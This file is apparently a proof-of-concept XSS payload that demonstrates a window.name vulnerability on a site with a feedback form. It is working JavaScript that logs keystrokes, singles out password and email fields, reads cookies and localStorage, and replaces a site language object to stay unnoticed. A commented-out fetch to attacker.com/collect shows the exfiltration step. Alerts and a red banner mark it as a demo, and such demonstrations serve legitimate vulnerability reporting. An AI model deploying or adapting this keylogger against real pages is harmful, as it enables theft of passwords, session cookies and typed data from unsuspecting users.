// DOM XSS Keylogger Demonstration Payload
// This demonstrates the severity of the window.name XSS vulnerability

// Initialize keylogger storage
var keylogBuffer = [];
var lastKeystroke = Date.now();

// Function to send captured keystrokes (for demo, just show in console)
function transmitKeystrokes(keys) {
    console.log("🚨 SECURITY DEMO: Keystrokes captured:", keys);
    
    // In a real attack, this would send to attacker's server:
    // fetch('https://attacker.com/collect', {
    //     method: 'POST',
    //     body: JSON.stringify({keystrokes: keys, url: location.href})
    // });
    
    // For demo purposes, show alert with captured data
    if (keys.length > 10) {
        alert("SECURITY DEMO ALERT:\n\nKeylogger captured: " + keys.slice(0, 50) + "...\n\nThis demonstrates how an attacker could steal everything you type!");
    }
}

// Main keylogger function
function captureKeystroke(event) {
    var key = event.key;
    var timestamp = Date.now();
    
    // Filter out system keys for demo clarity
    if (key.length === 1 || key === 'Backspace' || key === 'Enter' || key === 'Tab') {
        // Special handling for sensitive keys
        if (key === 'Backspace') {
            keylogBuffer.push('[BACKSPACE]');
        } else if (key === 'Enter') {
            keylogBuffer.push('[ENTER]');
        } else if (key === 'Tab') {
            keylogBuffer.push('[TAB]');
        } else {
            keylogBuffer.push(key);
        }
        
        lastKeystroke = timestamp;
        
        // Send keystrokes every 10 characters or after 3 seconds of inactivity
        if (keylogBuffer.length >= 10 || (timestamp - lastKeystroke > 3000 && keylogBuffer.length > 0)) {
            transmitKeystrokes(keylogBuffer.join(''));
            keylogBuffer = [];
        }
    }
}

// Enhanced keylogger that captures form-specific data
function captureFormData(event) {
    if (event.target.type === 'password') {
        console.log("🚨 PASSWORD FIELD DETECTED - In real attack, this would be stolen!");
        alert("SECURITY DEMO: Password field activity detected!\n\nThis shows how attackers can specifically target sensitive inputs.");
    }
    
    if (event.target.type === 'email' || event.target.name === 'email') {
        console.log("🚨 EMAIL FIELD DETECTED");
    }
}

// Install keylogger
document.addEventListener('keydown', captureKeystroke, true);
document.addEventListener('input', captureFormData, true);

// Show immediate proof the payload executed
alert("🚨 SECURITY DEMONSTRATION ACTIVE 🚨\n\nMalicious keylogger has been injected!\n\nEverything you type will now be captured and could be sent to an attacker.\n\nThis demonstrates the critical XSS vulnerability.");

// Add visual indicator for demo
var indicator = document.createElement('div');
indicator.innerHTML = '🚨 KEYLOGGER ACTIVE - DEMO MODE 🚨';
indicator.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    background: red;
    color: white;
    text-align: center;
    padding: 10px;
    z-index: 9999;
    font-weight: bold;
    font-size: 16px;
`;
document.body.insertBefore(indicator, document.body.firstChild);

// Provide the expected language object to maintain stealth
trustLng = {
    "FeedbackName": "Your Name",
    "FeedbackEmail": "Email Address", 
    "FeedbackMail": "Send Feedback",
    "FeedbackSubject": "Subject",
    "FeedbackDesc": "Description",
    "FeedbackWasSent": "Feedback sent successfully",
    "FeedbackMailFail": "Failed to send feedback",
    "FeedbackNegishutSend?": "Send feedback?",
    "FeedbackNegishutSendError": "Please check your input",
    "FeedbackEmailBad": "Invalid email format",
    "FeedbackEmailGood": "Valid email format",
    "Feedback": "Feedback"
};

// Additional demonstration: Show what else could be stolen
setTimeout(function() {
    var demoData = {
        cookies: document.cookie,
        localStorage: localStorage.length + " items in localStorage",
        currentPage: window.location.href,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    console.log("🚨 ADDITIONAL DATA THAT COULD BE STOLEN:", demoData);
}, 2000);

// Demonstrate session hijacking capability
if (document.cookie) {
    console.log("🚨 SESSION COOKIES ACCESSIBLE:", document.cookie);
}
